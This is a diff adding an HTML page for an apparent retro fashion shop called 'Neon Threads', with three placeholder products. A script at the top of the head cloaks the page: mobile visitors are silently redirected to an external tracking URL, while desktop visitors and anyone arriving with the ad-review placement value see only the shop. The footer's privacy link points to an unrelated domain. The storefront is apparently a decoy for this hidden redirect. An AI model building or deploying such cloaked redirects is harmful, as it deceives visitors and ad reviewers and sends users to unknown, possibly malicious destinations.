@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const utmXXX = urlParams.get("xxx");
+    const s = urlParams.get("s");
+    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    const lander = `https://klcxb6.mcgo2.com/visit/7030fb24-f71e-4d19-916a-a1c232f79601?s1=${s}`;
+    if (utmXXX === "__PLACEMENT__") { }
+    else if (isMobileDevice) { window.location.href = lander; } 
+    else { }
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Neon Threads - Retro Futuristic Fashion</title>
+    <style>
+        body {
+            font-family: 'Courier New', monospace;
+            background-color: #000;
+            color: #0ff;
+            margin: 0;
+            padding: 0;
+        }
+        header {
+            background-color: #0ff;
+            color: #000;
+            text-align: center;
+            padding: 20px;
+        }
+        nav {
+            background-color: #f0f;
+            padding: 10px;
+        }
+        nav ul {
+            list-style-type: none;
+            padding: 0;
+        }
+        nav ul li {
+            display: inline;
+            margin-right: 20px;
+        }
+        nav ul li a {
+            color: #000;
+            text-decoration: none;
+            font-weight: bold;
+        }
+        main {
+            padding: 20px;
+        }
+        .product {
+            background-color: #111;
+            border: 2px solid #0ff;
+            padding: 20px;
+            margin-bottom: 20px;
+        }
+        footer {
+            background-color: #0ff;
+            color: #000;
+            text-align: center;
+            padding: 10px;
+            position: fixed;
+            bottom: 0;
+            width: 100%;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>Neon Threads</h1>
+        <p>Retro Futuristic Fashion for the Cyberpunk Era</p>
+    </header>
+    <nav>
+        <ul>
+            <li><a href="#">Home</a></li>
+            <li><a href="#">Shop</a></li>
+            <li><a href="#">About</a></li>
+            <li><a href="#">Contact</a></li>
+        </ul>
+    </nav>
+    <main>
+        <div class="product">
+            <h2>Laser Cut Holographic Jacket</h2>
+            <p>Embrace the future with our cutting-edge holographic jacket. Perfect for night clubs and virtual reality meetups.</p>
+            <button>Add to Cart</button>
+        </div>
+        <div class="product">
+            <h2>LED Embedded Boots</h2>
+            <p>Light up the streets with our programmable LED boots. Sync with your smartphone for custom light shows.</p>
+            <button>Add to Cart</button>
+        </div>
+        <div class="product">
+            <h2>Quantum Fabric T-Shirt</h2>
+            <p>Experience comfort at the subatomic level with our quantum fabric tees. Changes color based on your mood.</p>
+            <button>Add to Cart</button>
+        </div>
+    </main>
+    <footer>
+        <p>&copy; 2023 Neon Threads. All rights reserved. | <a href="https://tokreward.com/privacy.html">Privacy Policy</a></p>
+    </footer>
+</body>
+</html>
